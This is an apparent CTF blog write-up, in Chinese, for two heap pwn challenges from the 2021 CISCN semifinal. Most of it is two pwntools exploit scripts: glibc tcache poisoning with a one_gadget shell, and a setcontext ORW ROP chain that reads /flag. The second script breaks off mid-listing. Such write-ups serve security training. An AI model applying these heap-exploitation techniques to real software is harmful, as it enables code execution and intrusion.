<!doctype html>
<head>
  <meta charset="utf-8">
  <meta name="description" content="&lt;p&gt;第五第五还行还行&lt;/p&gt;
&lt;h1 id=&#34;pwn1-duck&#34;&gt;&lt;a href=&#34;#pwn1-duck&#34; class=&#34;headerlink&#34; title=&#34;pwn1-duck&#34;&gt;&lt;/a&gt;pwn1-duck&lt;/h1&gt;&lt;p&gt; &lt;a href=&#34;http://blog.nsfocus.net/glibc-234/&#34;&gt;浅谈glibc新版本保护机制及绕过方法 – 绿盟科技技术博客 (nsfocus.">
  <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, user-scalable=yes">
  <title>2021ciscn华东北半决赛 wp | powercat</title>

  <link rel="stylesheet" id="chosen-theme" href="https://rawgit.com/fiatjaf/classless/master/themes/plain/theme.css">
  <script>
let link = document.getElementById('chosen-theme')
let widget = document.createElement('div')
widget.style.position = 'absolute'
widget.style.right = '5px'
widget.style.top = '2px'
widget.style.background = 'beige'
widget.style.color = '#444'
widget.style.zIndex = 99
widget.style.padding = '4px 8px'
widget.innerHTML = `
<label>
  <p>No theme was set on <code>theme_config</code>.<br>
     Choose a theme from the list to experiment with it:</p>
  <select></select>
</label>
`
fetch('https://api.github.com/repos/fiatjaf/classless/contents/themes')
  .then(r => r.json())
  .then(files => {
    document.body.appendChild(widget)
    let select = document.querySelector('select')
    files
      .filter(f => f.type === 'dir')
      .forEach(f => {
        let option = document.createElement('option')
        option.value = f.name
        option.innerHTML = f.name
        select.appendChild(option)
      })
    let options = Array.from(select.querySelectorAll('option'))
    let chosen = options[parseInt(Math.random() * options.length)]
    chosen.selected = true
    link.href = link.href.replace(/themes\/[^\/]+/, `themes/${chosen.value}`)
    select.addEventListener('change', e => {
      let chosen = e.target.value
      link.href = link.href.replace(/themes\/[^\/]+/, `themes/${chosen}`)
    })
  })
  .catch(console.log)
  </script>

<meta name="generator" content="Hexo 6.2.0"></head>

<body>
  <header role="banner">
      <a href="/">
        
          <img src="https://picsum.photos/640/480">
        
      </a>  
    <h1>
      <a href="/">powercat</a>
    </h1>
    <aside>
      <p></p>
    </aside>
  </header>
  
  <main>
    <article>
  <header>
  
  <h1><a href="http://example.com/2022/06/21/%E5%9B%BD%E8%B5%9B/">2021ciscn华东北半决赛 wp</a></h1>
  <aside>
    
    <time datetime="222022-06-21">
      June 21st 2022
    </time>
    
    <ul>
    
      <li><a href="/tags/writeup/">writeup</a></li>
    
    </ul>
  </aside>
</header>

  <div><p>第五第五还行还行</p>
<h1 id="pwn1-duck"><a href="#pwn1-duck" class="headerlink" title="pwn1-duck"></a>pwn1-duck</h1><p> <a target="_blank" rel="noopener" href="http://blog.nsfocus.net/glibc-234/">浅谈glibc新版本保护机制及绕过方法 – 绿盟科技技术博客 (nsfocus.net)</a></p>
<p>按照这个思路去打，uaf tcachebin attack</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import * </span></span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.arch = &#x27;i386&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(<span class="built_in">str</span>(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(<span class="built_in">str</span>(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	p = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn&quot;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(ip,port)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">if local:</span></span><br><span class="line"><span class="string">	#p = process([&quot;qemu-arm&quot;, &quot;-g&quot;, &quot;1212&quot;, &quot;-L&quot;, &quot;/usr/arm-linux-gnueabi&quot;,binary])</span></span><br><span class="line"><span class="string">	p = process([&quot;qemu-aarch64&quot;, &quot;-g&quot;, &quot;1212&quot;, &quot;-L&quot;, &quot;/usr/aarch64-linux-gnu/&quot;, binary])</span></span><br><span class="line"><span class="string">else:</span></span><br><span class="line"><span class="string">	p = remote(ip,port)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">cho</span>):</span><br><span class="line">	sla(<span class="string">&#x27;Choice: &#x27;</span>,cho)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">	choice(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">	choice(<span class="number">2</span>)</span><br><span class="line">	sla(<span class="string">&#x27;Idx: \n&#x27;</span>,idx)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">	choice(<span class="number">3</span>)</span><br><span class="line">	sla(<span class="string">&#x27;Idx: \n&#x27;</span>,idx)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">	choice(<span class="number">4</span>)</span><br><span class="line">	sla(<span class="string">&#x27;Idx: \n&#x27;</span>,idx)</span><br><span class="line">	sla(<span class="string">&#x27;Size: \n&#x27;</span>,size)</span><br><span class="line">	p.sendafter(<span class="string">&#x27;Content: \n&#x27;</span>,content) </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">	add()<span class="comment">#0</span></span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line">	show(<span class="number">0</span>)</span><br><span class="line">	key = u64(ru(<span class="string">&#x27;\x0a&#x27;</span>)[-<span class="number">5</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">	heap_base = key*<span class="number">0x1000</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;heapbase=&#x27;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;key=&#x27;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">		add()</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">		delete(i)</span><br><span class="line">	show(<span class="number">8</span>)</span><br><span class="line">	libc_base = u64(ru(<span class="string">&#x27;\x0a&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1f2cc0</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">	<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	0xda861 execve(&quot;/bin/sh&quot;, r13, r12)</span></span><br><span class="line"><span class="string">	constraints:</span></span><br><span class="line"><span class="string">	  [r13] == NULL || r13 == NULL</span></span><br><span class="line"><span class="string">	  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	0xda864 execve(&quot;/bin/sh&quot;, r13, rdx)</span></span><br><span class="line"><span class="string">	constraints:</span></span><br><span class="line"><span class="string">	  [r13] == NULL || r13 == NULL</span></span><br><span class="line"><span class="string">	  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	0xda867 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">	constraints:</span></span><br><span class="line"><span class="string">	  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">	  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span></span><br><span class="line">	fk = libc_base + <span class="number">0x1f4560</span>+<span class="number">0x60</span><span class="comment">#libc.sym[&#x27;__free_hook&#x27;]</span></span><br><span class="line">	stdout = libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">	og = libc_base + <span class="number">0xda864</span></span><br><span class="line"></span><br><span class="line">	pl = p64((fk)^key)</span><br><span class="line">	edit(<span class="number">7</span>,<span class="built_in">len</span>(pl),pl)</span><br><span class="line">	add()<span class="comment">#11</span></span><br><span class="line">	add()<span class="comment">#12</span></span><br><span class="line">	pl = p64(og)*<span class="number">2</span></span><br><span class="line">	edit(<span class="number">12</span>,<span class="built_in">len</span>(pl),pl)</span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(fk))</span><br><span class="line"></span><br><span class="line">	li = libc_base + <span class="number">0x1f4570</span></span><br><span class="line">	pl = p64(stdout^key)</span><br><span class="line">	delete(<span class="number">9</span>)</span><br><span class="line">	edit(<span class="number">9</span>,<span class="built_in">len</span>(pl),pl)</span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line">	add()<span class="comment">#13</span></span><br><span class="line">	add()<span class="comment">#14</span></span><br><span class="line">	pl = p64(<span class="number">0</span>)*<span class="number">8</span></span><br><span class="line">	edit(<span class="number">14</span>,<span class="built_in">len</span>(pl),pl)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#delete(11)</span></span><br><span class="line"></span><br><span class="line">	itr()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">i = 0</span></span><br><span class="line"><span class="string">while 1:</span></span><br><span class="line"><span class="string">	i += 1</span></span><br><span class="line"><span class="string">	log.warn(str(i))</span></span><br><span class="line"><span class="string">	try:  </span></span><br><span class="line"><span class="string">		pwn()</span></span><br><span class="line"><span class="string">	except Exception:</span></span><br><span class="line"><span class="string">		p.close()</span></span><br><span class="line"><span class="string">		if(local == 1):</span></span><br><span class="line"><span class="string">			p = process(binary)</span></span><br><span class="line"><span class="string">		else:</span></span><br><span class="line"><span class="string">			p = remote(ip,port)</span></span><br><span class="line"><span class="string">		continue</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	pwn()</span><br></pre></td></tr></table></figure>

<p><img src="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220620093813-jg3va74.png" alt="image.png"></p>
<h1 id="pwn2-bigduck"><a href="#pwn2-bigduck" class="headerlink" title="pwn2-bigduck"></a>pwn2-bigduck</h1><p>上一个题目加上了沙盒使用setcontext+gadget</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import * </span></span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.arch = &#x27;i386&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(<span class="built_in">str</span>(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(<span class="built_in">str</span>(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	p = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn&quot;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line">	<span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(ip,port)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">if local:</span></span><br><span class="line"><span class="string">	#p = process([&quot;qemu-arm&quot;, &quot;-g&quot;, &quot;1212&quot;, &quot;-L&quot;, &quot;/usr/arm-linux-gnueabi&quot;,binary])</span></span><br><span class="line"><span class="string">	p = process([&quot;qemu-aarch64&quot;, &quot;-g&quot;, &quot;1212&quot;, &quot;-L&quot;, &quot;/usr/aarch64-linux-gnu/&quot;, binary])</span></span><br><span class="line"><span class="string">else:</span></span><br><span class="line"><span class="string">	p = remote(ip,port)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">cho</span>):</span><br><span class="line">	sla(<span class="string">&#x27;Choice: &#x27;</span>,cho)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">	choice(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">	choice(<span class="number">2</span>)</span><br><span class="line">	sla(<span class="string">&#x27;Idx: \n&#x27;</span>,idx)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">	choice(<span class="number">3</span>)</span><br><span class="line">	sla(<span class="string">&#x27;Idx: \n&#x27;</span>,idx)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">	choice(<span class="number">4</span>)</span><br><span class="line">	sla(<span class="string">&#x27;Idx: \n&#x27;</span>,idx)</span><br><span class="line">	sla(<span class="string">&#x27;Size: \n&#x27;</span>,size)</span><br><span class="line">	p.sendafter(<span class="string">&#x27;Content: \n&#x27;</span>,content) </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">	add()<span class="comment">#0</span></span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line">	show(<span class="number">0</span>)</span><br><span class="line">	key = u64(ru(<span class="string">&#x27;\x0a&#x27;</span>)[-<span class="number">5</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">	heap_base = key*<span class="number">0x1000</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;heapbase=&#x27;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;key=&#x27;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">		add()</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">		delete(i)</span><br><span class="line">	edit(<span class="number">8</span>,<span class="number">9</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">9</span>)</span><br><span class="line">	show(<span class="number">8</span>)</span><br><span class="line">	libc_base = u64((ru(<span class="string">b&#x27;\x0a&#x27;</span>)[-<span class="number">6</span>:]).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1e0c61</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;libc=&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">	p_rsi_r = libc_base + <span class="number">0x000000000002a4cf</span></span><br><span class="line">	open_addr = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">	p_rdi_r = libc_base + <span class="number">0x0000000000028a55</span></span><br><span class="line">	p_rdx_r12_r = libc_base + <span class="number">0x0000000000112a51</span></span><br><span class="line">	read_addr = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">	puts = libc_base +libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">	setcontext = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">61</span></span><br><span class="line">	gev = libc_base + <span class="number">0x149e60</span>+<span class="number">576</span></span><br><span class="line"></span><br><span class="line">	orw = p64(heap_base+<span class="number">0x5d0</span>) + p64(p_rsi_r) + p64(<span class="number">0</span>) + p64(open_addr)</span><br><span class="line">	orw += p64(p_rdi_r) + p64(<span class="number">4</span>) + p64(p_rsi_r) + p64(heap_base+<span class="number">0x400</span>) + p64(p_rdx_r12_r) + p64(<span class="number">0x30</span>)*<span class="number">2</span> + p64(read_addr)</span><br><span class="line">	orw += p64(p_rdi_r) + p64(heap_base+<span class="number">0x400</span>) + p64(puts)+<span class="string">b&#x27;/flag\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">#edit()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	fk = libc_base + <span class="number">0x1E24A0</span>+<span class="number">0x60</span><span class="comment">#libc.sym[&#x27;__free_hook&#x27;]</span></span><br><span class="line">	stdout = libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">	og = libc_base + <span class="number">0xda864</span></span><br><span class="line">	og1 = heap_base + <span class="number">0x2a0</span></span><br><span class="line"></span><br><span class="line">	pl = p64(fk^key)</span><br><span class="line">	edit(<span class="number">7</span>,<span class="built_in">len</span>(pl),pl)</span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line">	add()<span class="comment">#11</span></span><br><span class="line">	add()<span class="comment">#12</span></span><br><span class="line">	pl = p64(gev)+p64(gev)</span><br><span class="line">	edit(<span class="number">12</span>,<span class="built_in">len</span>(pl),pl)</span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(fk))</span><br><span class="line"></span><br><span class="line">	pl = p64(heap_base+<span class="number">0x3b0</span>)*<span class="number">2</span></span><br><span class="line">	pl1 = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x20</span>+p64(setcontext)</span><br><span class="line">	pl1 = pl1.ljust(<span class="number">0xa0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">	pl1 += p64(heap_base+<span class="number">0x4c0</span>)+p64(p_rdi_r)</span><br><span class="line">	edit(<span class="number">0</span>,<span class="built_in">len</span>(pl1),pl1)</span><br><span class="line">	edit(<span class="number">1</span>,<span class="built_in">len</span>(pl),pl)</span><br><span class="line">	edit(<span class="number">3</span>,<span class="built_in">len</span>(orw),orw)</span><br><span class="line">	edit(<span class="number">4</span>,<span class="number">6</span>,<span class="string">b&#x27;/flag\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	pl = p64(stdout^key)</span><br><span class="line">	delete(<span class="number">9</span>)</span><br><span class="line">	edit(<span class="number">9</span>,<span class="built_in">len</span>(pl),pl)</span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line">	add()<span class="comment">#13</span></span><br><span class="line">	add()<span class="comment">#14</span></span><br><span class="line">	pl = p64(<span class="number">0x2a0</span>+heap_base)*<span class="number">2</span>+p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	edit(<span class="number">14</span>,<span class="built_in">len</span>(pl),pl)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#delete(11)</span></span><br><span class="line"></span><br><span class="line">	itr()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">i = 0</span></span><br><span class="line"><span class="string">while 1:</span></span><br><span class="line"><span class="string">	i += 1</span></span><br><span class="line"><span class="string">	log.warn(str(i))</span></span><br><span class="line"><span class="string">	try:  </span></span><br><span class="line"><span class="string">		pwn()</span></span><br><span class="line"><span class="string">	except Exception:</span></span><br><span class="line"><span class="string">		p.close()</span></span><br><span 